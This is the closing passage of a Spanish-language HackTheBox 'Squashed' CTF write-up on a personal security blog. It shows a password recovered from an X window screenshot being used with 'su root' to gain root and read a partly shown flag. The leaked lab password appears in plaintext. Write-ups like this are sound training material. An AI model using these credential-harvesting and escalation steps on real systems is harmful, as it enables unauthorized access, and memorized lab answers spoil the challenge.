<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ convert screenshot.xwd screenshot.png</span></span></code></pre></div>
<p>Y vaya vaya, ¡tenemos credenciales!
<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
<p>Me pensaba que iban a ser las credenciales para el usuario <code>ross</code> pero inocentemente probando estas credenciales para root&hellip;</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>alex@squashed:/var/www/html$ su ross
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>su ross
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Password: cah$mei7rai9A
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>su: Authentication failure
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>alex@squashed:/var/www/html$ su root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>su root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>Password: cah$mei7rai9A
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>id
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>uid=0(root) gid=0(root) groups=0(root)</span></span></code></pre></div>
<p>Y ya podríamos leer la flag.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>cat root.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>795ede7c08b5f41....</span></span></code></pre></div>
<p>¡Y ya estaría!</p>
<p>Happy Hacking! 🚀</p>

  </content>
  <p>
    
      <a href="/tags/hackthebox/">#HackTheBox</a>&nbsp;&nbsp;
    
      <a href="/tags/squashed/">#Squashed</a>&nbsp;&nbsp;
    
      <a href="/tags/writeup/">#Writeup</a>&nbsp;&nbsp;
    
      <a href="/tags/cybersecurity/">#Cybersecurity</a>&nbsp;&nbsp;
    
      <a href="/tags/penetration-testing/">#Penetration Testing</a>&nbsp;&nbsp;
    
      <a href="/tags/ctf/">#CTF</a>&nbsp;&nbsp;
    
      <a href="/tags/reverse-shell/">#Reverse Shell</a>&nbsp;&nbsp;
    
      <a href="/tags/privilege-escalation/">#Privilege Escalation</a>&nbsp;&nbsp;
    
      <a href="/tags/linux/">#Linux</a>&nbsp;&nbsp;
    
      <a href="/tags/nfs-enumeration/">#NFS Enumeration</a>&nbsp;&nbsp;
    
      <a href="/tags/abusing-nfs-uid/gid-missmatch/">#Abusing NFS UID/GID Missmatch</a>&nbsp;&nbsp;
    
      <a href="/tags/information-leakage/">#Information Leakage</a>&nbsp;&nbsp;
    
      <a href="/tags/abusing-.xauthority-cookie/">#Abusing .Xauthority Cookie</a>&nbsp;&nbsp;
    
  </p>

    </main>
    <footer>
      
  <span>© 2024 pointedsec</span>



    </footer>

    
</body>
</html>
